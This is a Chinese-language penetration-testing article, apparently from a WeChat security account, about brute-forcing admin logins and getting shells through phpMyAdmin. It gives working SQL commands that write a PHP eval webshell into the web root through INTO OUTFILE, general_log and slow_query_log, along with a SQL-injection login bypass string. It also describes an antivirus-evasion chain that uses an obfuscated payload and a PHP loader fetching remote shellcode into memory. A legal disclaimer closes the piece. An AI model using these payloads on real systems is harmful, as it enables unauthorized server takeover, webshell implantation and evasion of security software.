---
title: 穷举后台与phpMyAdmin getshell：从弱口令爆破到绕过杀软拿Shell的完整实战
url: https://mp.weixin.qq.com/s/62Nyzt0p7ECwAYUxyp3Vxg
source: Doonsec's feed
date: 2026-10-22
fetch_date: 2026-10-23T06:44:32.436083
---

# 穷举后台与phpMyAdmin getshell：从弱口令爆破到绕过杀软拿Shell的完整实战

# 穷举后台与phpMyAdmin getshell：从弱口令爆破到绕过杀软拿Shell的完整实战

原创

KLSEC
KLSEC

昆仑AI安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

去年帮一个朋友看他的电商站，后台登录页光秃秃的，没有验证码，没有失败次数限制。我拿Burp挂了字典跑了十分钟，`admin/admin123`直接进去了。进去之后发现功能很全，订单、商品、用户管理都有，但最关键的**文件上传功能被砍掉了**，换成了腾讯云COS直传。

朋友问我：“后台进来了，但没上传点，还能拿Shell吗？”

答案在数据库里。他的phpMyAdmin面板用同样的`admin/admin123`就能登录。而phpMyAdmin，是后台getshell最经典的跳板之一。

今天这篇文章，把“穷举后台”和“phpMyAdmin getshell”这两条线拆开。从弱口令爆破的实战技巧，到phpMyAdmin四种getshell方法的完整命令，再到一个**杀软拦截下的绕过案例**。每一步都有具体操作，不聊理论。

**一、穷举后台：别只盯着登录框**

弱口令爆破是后台getshell的第一步，但“爆破”不等于“挂个字典跑就完事”。

**先判断有没有爆破价值。** 打开登录页，看三个东西：有没有验证码、有没有失败次数限制、密码是否明文传输。三者全无，就是爆破的黄金目标。2026年的GoBruteforcer僵尸网络专门扫这种目标，它内置了22组硬编码凭证，针对XAMPP等套件的默认账户（daemon、nobody）做密码喷洒。

**字典的选择比字典的大小更重要。** 不要一上来扔rockyou。针对后台登录，先用“品牌名+年份+特殊字符”的组合字典。比如目标叫“智创科技”，字典里放`Zhichuang@2026`、`ZCkj_888`、`zhichuang123`。我实际测试中，AI生成的定制字典命中率比通用字典高出三倍以上。

**万能密码别忘试。** 2026年8月一个CN-SEC的案例里，师傅开局一个登录框，弱口令没爆出来，试了`admin' or '1'='1' #`，直接进去了——后台的登录SQL存在注入，而且没有做参数化查询。

**进了后台之后，优先找这四类功能点：**

第一，**文件上传/导入**。头像、附件、数据导入、模板上传。即使前端限制了后缀，后端不一定校验。

第二，**数据库管理入口**。有些后台集成了简易的数据库管理功能，或者暴露了phpMyAdmin的路径。

第三，**模板编辑/主题编辑**。ThinkPHP、WordPress这类框架的后台，模板编辑功能可以直接写入PHP代码。

第四，**备份/恢复功能**。如果能把数据库备份导出到Web目录，或者能恢复一个恶意备份文件，就是getshell的路径。

**二、phpMyAdmin getshell：四种方法，按条件选**

phpMyAdmin本身不提供文件上传接口，它的getshell能力来自**数据库的文件写入权限**和**phpMyAdmin的配置缺陷**。四种方法，取决于三个前置条件：**root权限、网站绝对路径、`secure_file_priv`的值**。

先查`secure_file_priv`：

```
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';
```

返回空字符串，四种方法都能用。返回`NULL`，`INTO OUTFILE`被禁用，但**日志写入和慢查询写入仍然可行**。返回一个具体路径（比如`/tmp`），只能往那个路径写。

**方法一：INTO OUTFILE（最快，但条件最苛刻）**

```
SELECT '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE 'C:/phpStudy/WWW/shell.php';
```

条件是`secure_file_priv`为空、MySQL用户有FILE权限、知道Web绝对路径。路径从哪来？`phpinfo()`页面直接泄露`DOCUMENT_ROOT`；如果目标用了phpStudy，执行`SHOW VARIABLES LIKE '%datadir%'`或`SELECT @@basedir`能反推安装路径。

**方法二：通用查询日志写入（general\_log）**

`general_log`记录用户执行的每一条SQL语句。把它指向Web目录，再执行一条包含恶意代码的查询，恶意代码就被写进了日志文件。

```
SET GLOBAL general_log = 'ON';SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php';SELECT '<?php @eval($_POST["cmd"]);?>';
```

日志文件本身是一个文本文件，但PHP引擎会把它当作PHP文件解析——只要后缀是`.php`。这个方法不依赖`secure_file_priv`，但要求MySQL用户有`SUPER`权限（通常是root），且日志文件路径可写。

**方法三：慢查询日志写入（绕过`secure_file_priv=NULL`的关键）**

这是2026年实战中最常用的phpMyAdmin getshell方法。当`secure_file_priv`被设为`NULL`，`INTO OUTFILE`彻底失效，但慢查询日志仍然可以被操控。

```
SHOW VARIABLES LIKE '%slow_query_log%';SET GLOBAL slow_query_log = ON;SET GLOBAL slow_query_log_file = 'C:/phpStudy/WWW/shell3.php';SELECT '<?php @eval($_POST["cmd"]);?>' OR SLEEP(11);
```

`SLEEP(11)`是关键。慢查询日志只记录执行时间超过`long_query_time`阈值的查询（默认10秒）。不加延时，这条查询根本不会被写进日志文件。**11秒是实战中常用的值**，比默认阈值多1秒，确保被记录。

**方法四：创建表写入（`secure_file_priv`受限时的备选）**

创建一个包含恶意代码的表，然后用`INTO OUTFILE`把表内容导出。这个方法本质上还是依赖文件写入权限，但在某些`secure_file_priv`配置下，表的导出路径可能和直接`SELECT INTO OUTFILE`不同。

**三、实战案例：杀软拦截下的绕过链**

上面四种方法是“教科书”版本。真实环境里，杀软会拦截你的写入。

2025年底一个微信公号披露的案例很典型。攻击者用`root/123456`进了phpMyAdmin，`secure_file_priv`不为空，`INTO OUTFILE`不能用，转向慢查询日志。

**第一次尝试，写入一句话马，失败。** 执行`SELECT '<?php @eval($_POST["cmd"]);?>' OR SLEEP(11);`时报错。但普通的SQL语句没问题，说明不是MySQL语法错误，是**杀软或安全设备拦截了包含`eval`的查询内容**。

**绕过尝试，在Payload中插入`_POST`调用。** 攻击者把Payload改成：

```
SELECT '<?php _POST["cmd"];eval("$a");?>' OR SLEEP(10);
```

这次日志文件写入成功了，说明杀软对`eval`的检测存在上下文盲区。但蚁剑连上去之后，命令执行报错`ret=-1`，`whoami`执行不了。检查`phpinfo()`发现`disable_functions`并没有禁用敏感函数。

**真正的坑在环境变量。** 报错信息是“不是内部命令”。原因是目标服务器的`PATH`环境变量没有包含`C:\Windows\System32\`，PHP执行系统命令时找不到`whoami.exe`。攻击者尝试在蚁剑里加上完整路径，仍然不行——PHP层面对命令执行做了限制。

**最终绕过：上传加载器 + Shellcode。** 一句话马执行不了系统命令，但可以执行PHP代码。攻击者上传了一个**C2加载器**（纯PHP写的下载器），通过加载器从远程拉取Shellcode到内存执行，绕过了杀软对落地文件的检测，最终上线。

这条链的教训很明确：**phpMyAdmin getshell不是“写进去就完事”**。写进去之后，杀软会拦命令执行、拦落地文件、拦网络外连。绕过杀软的核心思路，是从“落地可执行文件”转向“内存加载Shellcode”。

**四、2026年的新变量：AI生成的配置正在制造更多弱口令**

GoBruteforcer僵尸网络在2026年初的活跃度激增，研究人员给出的原因很具体：**大量服务器复用了大语言模型生成的通用配置片段**。这些配置里的默认用户名是`appuser`、`myuser`、`operator`，密码是可预测的弱口令。

XAMPP这类过时套件是重灾区。它们默认开启FTP服务，默认凭证是`daemon`或`nobody`加弱密码。攻击者通过FTP拿到网站根目录的写权限，直接上传WebShell，连phpMyAdmin都不需要。

这意味着后台getshell的入口比过去更多了。你不仅要防phpMyAdmin的弱口令，还要防XAMPP的默认配置、FTP的匿名访问、以及AI生成配置里的可预测账户。

**写在最后**

穷举后台和phpMyAdmin getshell，本质上是同一件事的两面：**用最低的成本拿到一个文件写入能力，再把写入能力变成代码执行能力**。

弱口令爆破拿到的是入口，phpMyAdmin的四种写入方法拿到的是跳板。杀软拦截是这条路上最大的变量，绕过它的关键在于从“落地”转向“内存”。而AI生成的配置正在让入口变得更多、更容易猜——这是2026年防守方需要认真对待的新现实。

下次你测一个后台，别爆出密码就急着找上传点。看看数据库面板的版本，查一下`secure_file_priv`的值，如果路径条件允许，慢查询日志可能比文件上传更快。

**严正声明**

本文所述所有技术内容仅用于**已获得明确书面授权**的安全测试、研究和教育场景。phpMyAdmin及后台系统的弱口令爆破和getshell操作必须在SRC平台或客户授权的资产范围内进行。靶场环境应部署在隔离网络中。未授权扫描、爆破、写入WebShell行为违反《中华人民共和国网络安全法》第27条及《刑法》第285条，将承担法律责任。技术无罪，边界是法律。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3oR6eMARh6wtjfMh6fwl8NYiat7oWh8bdRHo8jdFYlfhib3PC4T3bmyy723z9nJMbiclkFtRb118WyL0y6GsGfXpvibHpgszPyXcicI109F91KBo/640?wx_fmt=png&from=appmsg)

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3oR6eMARh6zL8x37G6prKFHZF4gTaajT0RYoRj81C6Rod7btfah6ZiaFaxIibKsVXNU7SMqnZia2FOtCYLFFgMor803P3ysbiba9ruW8LoMzjQw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过